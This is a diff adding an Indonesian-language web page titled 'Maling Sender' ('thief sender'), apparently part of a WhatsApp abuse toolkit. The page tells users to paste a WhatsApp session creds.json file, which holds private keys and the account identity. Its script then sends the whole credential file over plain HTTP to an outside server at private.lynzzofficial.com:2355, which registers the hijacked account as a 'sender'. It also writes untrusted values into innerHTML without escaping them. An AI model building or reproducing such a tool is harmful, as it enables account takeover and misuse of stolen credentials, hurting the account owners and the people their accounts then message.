@@ -1,0 +1,763 @@
+<!-- maling_sender.html -->
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Maling Sender - Vortex Ghost</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0D0221;
+            color: #fff;
+            font-family: 'Share Tech Mono', monospace;
+            min-height: 100vh;
+            background: linear-gradient(180deg, #0D0221 0%, #1A0533 50%, #0D0221 100%);
+        }
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #7B1FA2;
+            border-radius: 4px;
+        }
+
+        .app-header {
+            display: flex;
+            align-items: center;
+            padding: 16px 20px;
+            background: rgba(13, 2, 33, 0.95);
+            border-bottom: 1px solid rgba(234, 128, 252, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+        .app-header .back-btn {
+            background: none;
+            border: none;
+            color: #EA80FC;
+            font-size: 20px;
+            cursor: pointer;
+            padding: 4px;
+            margin-right: 12px;
+        }
+        .app-header .title {
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            font-size: 16px;
+            color: #fff;
+            flex: 1;
+            text-align: center;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 16px 20px;
+            padding-bottom: 40px;
+        }
+
+        /* Info Card */
+        .info-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 16px;
+            padding: 16px;
+            border: 1px solid rgba(123, 31, 162, 0.2);
+            margin-bottom: 20px;
+        }
+        .info-card .header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 8px;
+        }
+        .info-card .header i {
+            color: #EA80FC;
+            font-size: 18px;
+        }
+        .info-card .header h4 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 14px;
+            color: #EA80FC;
+        }
+        .info-card p {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 13px;
+            line-height: 1.6;
+        }
+        .info-card p strong {
+            color: #fff;
+        }
+
+        /* Text Area */
+        .textarea-wrapper {
+            border-radius: 16px;
+            border: 1px solid rgba(123, 31, 162, 0.3);
+            overflow: hidden;
+            margin-bottom: 16px;
+            transition: border 0.2s;
+        }
+        .textarea-wrapper:focus-within {
+            border-color: #EA80FC;
+        }
+        .textarea-wrapper textarea {
+            width: 100%;
+            padding: 16px;
+            background: rgba(255, 255, 255, 0.05);
+            color: #fff;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 12px;
+            border: none;
+            outline: none;
+            resize: vertical;
+            min-height: 180px;
+            line-height: 1.6;
+        }
+        .textarea-wrapper textarea::placeholder {
+            color: rgba(255, 255, 255, 0.2);
+        }
+
+        /* Buttons Row */
+        .btn-row {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .btn-row button {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            border-radius: 12px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .btn-row .btn-validate {
+            background: linear-gradient(135deg, #7B1FA2, #EA80FC);
+            color: #fff;
+        }
+        .btn-row .btn-validate:hover {
+            transform: scale(1.02);
+        }
+        .btn-row .btn-validate:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: scale(1);
+        }
+        .btn-row .btn-clear {
+            background: rgba(255, 0, 0, 0.1);
+            color: #ff6b6b;
+            border: 1px solid rgba(255, 0, 0, 0.2);
+        }
+        .btn-row .btn-clear:hover {
+            background: rgba(255, 0, 0, 0.2);
+        }
+
+        /* Preview */
+        .preview-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 16px;
+            padding: 20px;
+            border: 1px solid rgba(76, 175, 80, 0.3);
+            margin-bottom: 16px;
+            display: none;
+        }
+        .preview-card.show {
+            display: block;
+        }
+        .preview-card .preview-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+        .preview-card .preview-title i {
+            color: #EA80FC;
+            font-size: 18px;
+        }
+        .preview-card .preview-title h4 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 14px;
+            color: #EA80FC;
+        }
+        .preview-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        .preview-item:last-child {
+            border-bottom: none;
+        }
+        .preview-item .icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: rgba(123, 31, 162, 0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #EA80FC;
+            font-size: 12px;
+        }
+        .preview-item .label {
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 11px;
+            min-width: 80px;
+        }
+        .preview-item .value {
+            color: #fff;
+            font-size: 14px;
+        }
+
+        /* Check Connection Button */
+        .btn-check-conn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 16px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            background: linear-gradient(135deg, #7B1FA2, #EA80FC);
+            color: #fff;
+            box-shadow: 0 8px 30px rgba(123, 31, 162, 0.3);
+            transition: all 0.2s;
+            margin-bottom: 16px;
+            display: none;
+        }
+        .btn-check-conn.show {
+            display: block;
+        }
+        .btn-check-conn:hover {
+            transform: scale(1.02);
+        }
+        .btn-check-conn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: scale(1);
+        }
+
+        /* Success Result */
+        .success-result {
+            background: linear-gradient(135deg, rgba(76, 175, 80, 0.2), rgba(76, 175, 80, 0.1));
+            border: 1px solid rgba(76, 175, 80, 0.3);
+            border-radius: 16px;
+            padding: 24px;
+            text-align: center;
+            display: none;
+        }
+        .success-result.show {
+            display: block;
+        }
+        .success-result .icon {
+            font-size: 48px;
+            color: #4CAF50;
+            margin-bottom: 8px;
+        }
+        .success-result h3 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 18px;
+            color: #4CAF50;
+            margin-bottom: 4px;
+        }
+        .success-result .phone {
+            font-size: 24px;
+            font-weight: 700;
+            color: #EA80FC;
+            margin: 4px 0;
+        }
+        .success-result .sub {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        /* Status Message */
+        .status-msg {
+            padding: 14px 16px;
+            border-radius: 16px;
+            margin-bottom: 16px;
+            display: none;
+            font-size: 14px;
+            border: 1px solid transparent;
+        }
+        .status-msg.show {
+            display: block;
+        }
+        .status-msg.success {
+            background: rgba(76, 175, 80, 0.15);
+            border-color: #4CAF50;
+            color: #4CAF50;
+        }
+        .status-msg.error {
+            background: rgba(255, 0, 0, 0.1);
+            border-color: #ff6b6b;
+            color: #ff6b6b;
+        }
+        .status-msg.info {
+            background: rgba(234, 128, 252, 0.1);
+            border-color: #EA80FC;
+            color: #EA80FC;
+        }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            max-width: 500px;
+            width: calc(100% - 32px);
+            padding: 14px 20px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            z-index: 2000;
+            display: none;
+            text-align: center;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.6);
+            animation: slideUp 0.3s ease;
+        }
+        .toast.show {
+            display: block;
+        }
+        .toast.success {
+            background: rgba(76, 175, 80, 0.9);
+            color: #fff;
+        }
+        .toast.error {
+            background: rgba(255, 0, 0, 0.85);
+            color: #fff;
+        }
+        .toast.info {
+            background: rgba(123, 31, 162, 0.9);
+            color: #fff;
+        }
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
+        }
+
+        .spinner {
+            width: 24px;
+            height: 24px;
+            margin: 0 auto;
+            border: 3px solid rgba(234, 128, 252, 0.2);
+            border-top: 3px solid #EA80FC;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .btn-loading .btn-text {
+            display: none;
+        }
+        .btn-loading .spinner {
+            display: inline-block;
+        }
+        .btn-loading .spinner.small {
+            width: 18px;
+            height: 18px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== HEADER ===== -->
+    <header class="app-header">
+        <button class="back-btn" onclick="window.location.href='dashboard.html'">
+            <i class="fas fa-arrow-left"></i>
+        </button>
+        <span class="title">MALING SENDER</span>
+        <div style="width:36px;"></div>
+    </header>
+
+    <!-- ===== MAIN CONTENT ===== -->
+    <div class="container" id="mainContainer">
+
+        <!-- Info Card -->
+        <div class="info-card">
+            <div class="header">
+                <i class="fas fa-info-circle"></i>
+                <h4>INFORMASI</h4>
+            </div>
+            <p>
+                <strong>📌 Cara Penggunaan:</strong><br />
+                1. Copy isi file <strong>creds.json</strong> dari WhatsApp session<br />
+                2. Paste ke text area di bawah<br />
+                3. Klik <strong>VALIDATE</strong> untuk memeriksa format<br />
+                4. Jika valid, klik <strong>CEK KONEKSI WHATSAPP</strong><br />
+                5. Tunggu 10-30 detik<br />
+                6. Jika berhasil, sender akan aktif
+            </p>
+        </div>
+
+        <!-- Text Area -->
+        <div class="textarea-wrapper">
+            <textarea id="credsInput" placeholder='Paste isi creds.json di sini...
+
+Contoh:
+{
+  "noiseKey": {
+    "private": {
+      "type": "Buffer",
+      "data": "mORmp+QkRIQnP0V4PrsK4/Hpuz9iLxViv/0SENuJZmY="
+    },
+    ...
+  }
+}'></textarea>
+        </div>
+
+        <!-- Buttons Row -->
+        <div class="btn-row">
+            <button class="btn-validate" id="validateBtn" onclick="validateCreds()">
+                <span class="btn-text"><i class="fas fa-check-circle"></i> VALIDATE</span>
+                <span class="spinner small" style="display:none;"></span>
+            </button>
+            <button class="btn-clear" onclick="clearData()">
+                <i class="fas fa-times"></i> CLEAR
+            </button>
+        </div>
+
+        <!-- Status Message -->
+        <div class="status-msg" id="statusMsg"></div>
+
+        <!-- Preview -->
+        <div class="preview-card" id="previewCard">
+            <div class="preview-title">
+                <i class="fas fa-eye"></i>
+                <h4>PREVIEW CREDS.JSON</h4>
+            </div>
+            <div id="previewContent"></div>
+        </div>
+
+        <!-- Check Connection Button -->
+        <button class="btn-check-conn" id="checkConnBtn" onclick="checkConnection()">
+            <span class="btn-text"><i class="fas fa-sensors"></i> CEK KONEKSI WHATSAPP</span>
+            <span class="spinner small" style="display:none;"></span>
+        </button>
+
+        <!-- Success Result -->
+        <div class="success-result" id="successResult">
+            <div class="icon"><i class="fas fa-check-circle"></i></div>
+            <h3>✓ SENDER AKTIF</h3>
+            <div class="phone" id="successPhone">-</div>
+            <div class="sub">Berhasil ditambahkan ke akun Anda</div>
+        </div>
+
+    </div>
+
+    <!-- ===== TOAST ===== -->
+    <div class="toast" id="toast"></div>
+
+    <script>
+        // ============================================================
+        //  MALING SENDER - SAMA PERSIS DENGAN maling_sender.dart
+        // ============================================================
+
+        (function() {
+            'use strict';
+
+            const API_BASE = 'http://private.lynzzofficial.com:2355';
+
+            // === STATE ===
+            const sessionKey = localStorage.getItem('sessionKey') || '';
+            const username = localStorage.getItem('username') || '';
+            const role = localStorage.getItem('role') || 'member';
+            let credsData = null;
+            let isProcessing = false;
+            let isConnected = false;
+            let phoneNumber = '';
+
+            // === DOM REFS ===
+            const credsInput = document.getElementById('credsInput');
+            const validateBtn = document.getElementById('validateBtn');
+            const statusMsg = document.getElementById('statusMsg');
+            const previewCard = document.getElementById('previewCard');
+            const previewContent = document.getElementById('previewContent');
+            const checkConnBtn = document.getElementById('checkConnBtn');
+            const successResult = document.getElementById('successResult');
+            const successPhone = document.getElementById('successPhone');
+            const toast = document.getElementById('toast');
+
+            // === HELPERS ===
+            function showToast(msg, type = 'info') {
+                toast.textContent = msg;
+                toast.className = 'toast show ' + type;
+                clearTimeout(toast._timer);
+                toast._timer = setTimeout(() => {
+                    toast.className = 'toast';
+                }, 3000);
+            }
+
+            function showStatus(msg, type = 'info') {
+                statusMsg.textContent = msg;
+                statusMsg.className = 'status-msg show ' + type;
+            }
+
+            function hideStatus() {
+                statusMsg.className = 'status-msg';
+            }
+
+            function setLoading(loading) {
+                isProcessing = loading;
+                if (loading) {
+                    validateBtn.classList.add('btn-loading');
+                    validateBtn.disabled = true;
+                    validateBtn.querySelector('.btn-text').style.display = 'none';
+                    validateBtn.querySelector('.spinner').style.display = 'inline-block';
+                } else {
+                    validateBtn.classList.remove('btn-loading');
+                    validateBtn.disabled = false;
+                    validateBtn.querySelector('.btn-text').style.display = 'inline';
+                    validateBtn.querySelector('.spinner').style.display = 'none';
+                }
+            }
+
+            function setConnLoading(loading) {
+                if (loading) {
+                    checkConnBtn.classList.add('btn-loading');
+                    checkConnBtn.disabled = true;
+                    checkConnBtn.querySelector('.btn-text').style.display = 'none';
+                    checkConnBtn.querySelector('.spinner').style.display = 'inline-block';
+                } else {
+                    checkConnBtn.classList.remove('btn-loading');
+                    checkConnBtn.disabled = false;
+                    checkConnBtn.querySelector('.btn-text').style.display = 'inline';
+                    checkConnBtn.querySelector('.spinner').style.display = 'none';
+                }
+            }
+
+            function extractPhoneNumber(creds) {
+                try {
+                    if (creds && creds.me && creds.me.id) {
+                        return creds.me.id.split(':')[0];
+                    }
+                    return '-';
+                } catch (e) {
+                    return '-';
+                }
+            }
+
+            // === VALIDATE CREDS ===
+            window.validateCreds = function() {
+                const text = credsInput.value.trim();
+                if (!text) {
+                    showStatus('❌ Masukkan isi creds.json terlebih dahulu', 'error');
+                    return;
+                }
+
+                hideStatus();
+                setLoading(true);
+
+                try {
+                    // Bersihkan teks
+                    let cleanText = text;
+                    if (cleanText.startsWith('```json')) {
+                        cleanText = cleanText.substring(7);
+                    } else if (cleanText.startsWith('```')) {
+                        cleanText = cleanText.substring(3);
+                    }
+                    if (cleanText.endsWith('```')) {
+                        cleanText = cleanText.substring(0, cleanText.length - 3);
+                    }
+                    cleanText = cleanText.trim();
+
+                    const jsonData = JSON.parse(cleanText);
+
+                    // Validasi minimal struktur
+                    if (!jsonData.me || !jsonData.registered) {
+                        throw new Error('File bukan creds.json yang valid (me atau registered tidak ditemukan)');
+                    }
+                    if (!jsonData.me.id) {
+                        throw new Error('me.id tidak ditemukan dalam creds');
+                    }
+
+                    credsData = jsonData;
+                    phoneNumber = extractPhoneNumber(jsonData);
+
+                    // Tampilkan preview
+                    showPreview(jsonData);
+
+                    // Tampilkan tombol check connection
+                    checkConnBtn.classList.add('show');
+
+                    showStatus('✓ Creds valid! Silahkan cek koneksi.', 'success');
+                    setLoading(false);
+
+                } catch (e) {
+                    showStatus('❌ Format tidak valid: ' + e.message, 'error');
+                    credsData = null;
+                    previewCard.classList.remove('show');
+                    checkConnBtn.classList.remove('show');
+                    setLoading(false);
+                }
+            };
+
+            // === SHOW PREVIEW ===
+            function showPreview(creds) {
+                const name = creds.me?.name || 'Unknown';
+                const platform = creds.platform || creds.me?.platform || 'Unknown';
+                const deviceId = creds.deviceId || '-';
+                const registrationId = creds.registrationId || '-';
+
+                previewContent.innerHTML = `
+                    <div class="preview-item">
+                        <div class="icon"><i class="fas fa-phone"></i></div>
+                        <span class="label">Nomor</span>
+                        <span class="value">${phoneNumber}</span>
+                    </div>
+                    <div class="preview-item">
+                        <div class="icon"><i class="fas fa-user"></i></div>
+                        <span class="label">Nama</span>
+                        <span class="value">${name}</span>
+                    </div>
+                    <div class="preview-item">
+                        <div class="icon"><i class="fas fa-devices"></i></div>
+                        <span class="label">Platform</span>
+                        <span class="value">${platform}</span>
+                    </div>
+                    <div class="preview-item">
+                        <div class="icon"><i class="fas fa-fingerprint"></i></div>
+                        <span class="label">Device ID</span>
+                        <span class="value">${deviceId}</span>
+                    </div>
+                    <div class="preview-item">
+                        <div class="icon"><i class="fas fa-hashtag"></i></div>
+                        <span class="label">Registration ID</span>
+                        <span class="value">${registrationId}</span>
+                    </div>
+                `;
+                previewCard.classList.add('show');
+            }
+
+            // === CHECK CONNECTION ===
+            window.checkConnection = function() {
+                if (!credsData) {
+                    showStatus('❌ Validasi creds.json terlebih dahulu', 'error');
+                    return;
+                }
+
+                setConnLoading(true);
+                showStatus('⏳ Mengecek koneksi WhatsApp...\nIni bisa memakan waktu 10-30 detik', 'info');
+
+                const payload = {
+                    sessionKey: sessionKey,
+                    creds: credsData,
+                    phoneNumber: phoneNumber
+                };
+
+                fetch(`${API_BASE}/api/check-sender-connection`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    })
+                    .then(res => res.json())
+                    .then(data => {
+                        setConnLoading(false);
+                        if (data.success) {
+                            isConnected = true;
+                            successPhone.textContent = data.phoneNumber || phoneNumber;
+                            successResult.classList.add('show');
+                            showStatus('✓ Koneksi berhasil! Sender aktif.', 'success');
+                            showToast('✓ Sender berhasil ditambahkan!', 'success');
+
+                            // Sembunyikan tombol check
+                            checkConnBtn.classList.remove('show');
+
+                            // Simpan ke localStorage
+                            localStorage.setItem('maling_sender_' + username, JSON.stringify({
+                                phone: data.phoneNumber,
+                                name: data.name,
+                                type: data.type,
+                                timestamp: Date.now()
+                            }));
+                        } else {
+                            showStatus('❌ Gagal connect: ' + (data.message || 'Unknown error'), 'error');
+                            showToast('❌ Gagal connect: ' + (data.message || 'Unknown error'), 'error');
+                        }
+                    })
+                    .catch(err => {
+                        setConnLoading(false);
+                        showStatus('❌ Gagal connect: ' + err.message, 'error');
+                        showToast('❌ Gagal connect: ' + err.message, 'error');
+                    });
+            };
+
+            // === CLEAR DATA ===
+            window.clearData = function() {
+                credsInput.value = '';
+                credsData = null;
+                phoneNumber = '';
+                isConnected = false;
+                hideStatus();
+                previewCard.classList.remove('show');
+                checkConnBtn.classList.remove('show');
+                successResult.classList.remove('show');
+                showToast('Data cleared', 'info');
+            };
+
+            // === KEYBOARD SHORTCUT ===
+            credsInput.addEventListener('keydown', function(e) {
+                if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
+                    e.preventDefault();
+                    validateCreds();
+                }
+            });
+
+            // === INIT ===
+            function init() {
+                if (!sessionKey || !username) {
+                    window.location.href = 'login.html';
+                    return;
+                }
+
+                // Cek apakah sudah ada sender dari maling sebelumnya
+                const saved = localStorage.getItem('maling_sender_' + username);
+                if (saved) {
+                    try {
+                        const data = JSON.parse(saved);
+                        // Tampilkan info bahwa sudah ada sender
+                        checkConnBtn.classList.add('show');
+                        checkConnBtn.innerHTML = `<span class="btn-text"><i class="fas fa-check-circle"></i> SENDER AKTIF (${data.phone})</span>`;
+                        checkConnBtn.style.background = 'rgba(76,175,80,0.2)';
+                        checkConnBtn.style.color = '#4CAF50';
+                        checkConnBtn.style.border = '1px solid rgba(76,175,80,0.3)';
+                        checkConnBtn.disabled = true;
+                        checkConnBtn.onclick = null;
+                    } catch (e) {}
+                }
+            }
+
+            init();
+
+        })();
+    </script>
+
+</body>
+</html>
